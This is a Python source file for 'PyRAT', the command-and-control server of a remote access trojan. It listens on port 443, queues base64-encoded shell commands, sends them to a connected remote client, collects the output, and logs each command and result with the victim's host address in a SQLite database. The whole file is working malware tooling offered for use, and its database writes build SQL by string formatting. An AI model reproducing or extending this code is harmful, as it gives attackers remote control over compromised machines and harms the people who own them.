#!/bin/python3
"""The purpose of this software is to provide a centralized location for
remote clients to 1) receive commands and 2) return results/messages."""

import argparse
import subprocess
import socket
import sqlite3
from base64 import b64encode as b64e
from base64 import b64decode as b64d
from datetime import datetime
from turtle import width
from requests.exceptions import Timeout

from async_timeout import timeout

parser = argparse.ArgumentParser(description='Establish a PyRAT server.')
# TODO:  rhost/rport will be for future support of bind shells.
# parser.add_argument('--rhost',
#                      type=str,
#                      help='The remote host IP address to connect to.',
#                      default='127.0.0.1')
# parser.add_argument('--rport',
#                      type=str,
#                      help='The remote port to connect to.',
#                      default='4443')
parser.add_argument('--lhost',
                     type=str,
                     help='The IP address to listen on.  Default:  0.0.0.0',
                     default='0.0.0.0')
parser.add_argument('--lport',
                     type=str,
                     help='The port to listen on.  Default:  443',
                     default='443')


class Server():
    def __init__(self, lhost, lport):
        """Basic class initialization."""
        self.lhost = lhost
        self.lport = lport
        # Queue of commands to be populated later.
        self.queue = []
        # Handles the connection keep-alive status.
        self.accepted = False
        # This is a variable to hold the reference to the connection in use.
        self.conn = ''
    
    def inst(self):  
        """This will instantiate a server on lhost and lport."""
        self.ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ss.bind((self.lhost, int(self.lport)))
        self.ss.listen(1)
        self.ss.settimeout(10)

    def queue_cmd(self, cmd='ls'):
        """Queue a command from the CLI."""
        # First convert everything to base64 to reduce bad characters messing
        # stuff up.  Produces a bytes object.
        cmd_enc = b64e(cmd.encode('UTF-8'))
        self.queue.append(cmd_enc)
        if len(self.queue) == 1:
            verb = 'is'
            plural = 'command'
        else:
            verb = 'are'
            plural = 'commands'
        print(">>>" + cmd + "<<< has been appended.  There {} currently {} {} "
              "in the queue.\n".format(verb, len(self.queue), plural))
        print('QUEUE CONTENTS:\n---------------------')
        # To string for user visibility.
        for item in self.queue:
            print(b64d(item).decode('UTF-8'))
        print('\n')

    def flush_queue(self):
        """Flush the current command queue."""
        self.queue = []
        print("Queue flushed.")
    
    def inspect_queue(self):
        """Print queue contents to terminal."""
        print('\nQUEUE CONTENTS:\n---------------------')
        # To string for user visibility.
        for item in self.queue:
            print(b64d(item).decode('UTF-8'))
        print('\n')

    def fire_cmd(self):
        """Send the command to the remote client."""
        try:
            # Get the first command to execute.
            cmd = self.queue[0]
            if not self.accepted:  # Hasn't run yet.
                # Set KEEEPALIVE to True.
                if self.ss.getsockopt(\
                    socket.SOL_SOCKET, socket.SO_KEEPALIVE) == 0:
                    self.ss.setsockopt(\
                        socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.conn = self.ss.accept()[0]
                self.rhost = self.conn.getpeername()[0]
                self.rport = self.conn.getpeername()[1]
                self.accepted = True
            
            len_cmd = bytes(str(len(cmd)).zfill(5), encoding='UTF-8')
            self.conn.send(len_cmd + b'\n' + cmd)
            # print('Sent this to client:')
            # print(len_cmd + b'\n' + cmd)
            # First 5 bytes contains message size (plus a \n)
            size = self.conn.recv(6).strip()
            print("size = " + str(int(size.decode('UTF-8'))) + ' bytes')
            size = int(size)
            msg = b''
            for i in range(size): 
                msg += self.conn.recv(1)
            print('\n' + msg.decode('UTF-8'))

            # Only pop command from queue if it completed successfully.
            self.queue.pop(0)
            # These commands were executed.  Send info to db.
            self._db_execute_cmd(cmd)
            self._db_execute_msg(b64e(msg))
        except IndexError:
            print('\nNothing to fire as queue is empty!\n')
        except OSError:
            print('\nIs a client connected?  Timeout occurred!\n'
                  'The server\'s socket '
                  'has been killed.  Restart the client and attempt '
                  'to fire the command again.\n')
            self.accepted = False
        except ValueError:
            # Try to flush the queue by reading a lot of bytes.
            msg = self.conn.recv(1024)
            print('Received:\n')
            print(msg)
            print('\nSomething is wrong with the message from the client.\n'
                  'Try again?\n')
    
    def socket_kill(self):
        """Kill TCP connections."""
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
            self.conn.close()
        except Exception:
            pass
        try:
            self.ss.shutdown(socket.SHUT_RDWR)
            self.ss.close()
        except Exception:
            pass

    def _db_execute_cmd(self, cmd):
        """Send the commands to the SQLite database."""
        conn = sqlite3.connect('pyrat.db')
        try:  # Does table already exist?
            with conn:
                conn.execute('CREATE TABLE commands (date text, cmd text, '
                            'rhost text)')
        except sqlite3.OperationalError:
            pass
        try:
            with conn:
                date_ = str(datetime.now())
                conn.execute('INSERT INTO commands VALUES ("{}", "{}", '
                            '"{}")'.format(date_, cmd.decode('UTF-8'),
                            str(self.rhost)))
        except Exception:
            print('Data not inserted into pyrat.db.  Check the SQLite database'
                  ' integrity.')
        conn.close()
    
    def _db_execute_msg(self, msg):
        """Send the received messages to the SQLite database."""
        conn = sqlite3.connect('pyrat.db')
        try:  # Does table already exist?
            with conn:
                conn.execute('CREATE TABLE messages (date text, msg text, '
                            'rhost text)')
        except sqlite3.OperationalError:
            pass
        try:
            with conn:
                date_ = str(datetime.now())
                conn.execute('INSERT INTO messages VALUES ("{}", "{}", '
                            '"{}")'.format(date_, msg.decode('UTF-8'),
                            str(self.rhost)))
        except Exception:
            print('Data not inserted into pyrat.db.  Check the SQLite database'
                  ' integrity.')
        conn.close()
    
    def kill_client(self):
        """Send a kill message to the client."""
        if self.conn == '':
            self.conn = self.ss.accept()[0]
            self.rhost = self.conn.getpeername()[0]
            self.rport = self.conn.getpeername()[1]
            self.accepted = True
        cmd = b64e('pyratkill'.encode('UTF-8'))
        len_cmd = bytes(str(len(cmd)).zfill(5), encoding='UTF-8')
        self.conn.send(len_cmd + b'\n' + cmd)

def establish():
    """Instantiate a server instance."""
    args = parser.parse_args()
    server = Server(args.lhost, args.lport)
    server.inst()

    banner = """
__________        __________   ________________
\______   \___.__.\______   \ /  _  \__    ___/
|     ___<   |  | |       _/ /  /_\  \|    |   
|    |    \___  | |    |   \/    |    \    |   
|____|    / ____| |____|_  /\____|__  /____|   
          \/             \/         \/         
"""

    print(banner)
    print('Welcome to the PyRAT server!\nType "help" for help below.\n')

    while True:  # Ctrl+C or 'quit' or 'exit' will break.
        try:
            action = str(input('What would you like to do?  '))
            if action == 'quit' or action == 'exit':
                server.kill_client()
                server.socket_kill()
                print('Thanks for using PyRAT!')
                break
            elif action == 'help':
                print("This instance is a server designed to handle"
                      " connections from a PyRAT client on a remote host.  "
                      "\n\nOptions are:\nqueue - queue command(s)\nfire - "
                      "fire command(s)\nflush - flush queue\n? - inspect "
                      "queue\nquit - quit PyRAT\n")
            elif action == 'queue' or action == 'q':
                cmd = str(input('Please enter a command to send to the '
                                'client:  '))
                server.queue_cmd(cmd)
            elif action == 'flush':
                server.flush_queue()
            elif action == '?':
                server.inspect_queue()
            elif action == 'test':  # Dev debugger.
                r = subprocess.run('ls -la', shell=True, capture_output=True)
                output = r.stdout.decode('UTF-8')
                if r.stderr.decode('UTF-8') == '':
                    error = 'No errors'
                print(output + error)
            elif action == 'fire' or action == 'f':
                server.fire_cmd()
            else:
                print("Hmm, I don't recognize that.  Please try again.\n\n")
        except KeyboardInterrupt:  # User pressed Ctrl+c.
            print('\nYou typed Ctrl+c.  Exiting.  Thanks for using PyRAT!\n')
            break


if __name__ == '__main__':
    establish()
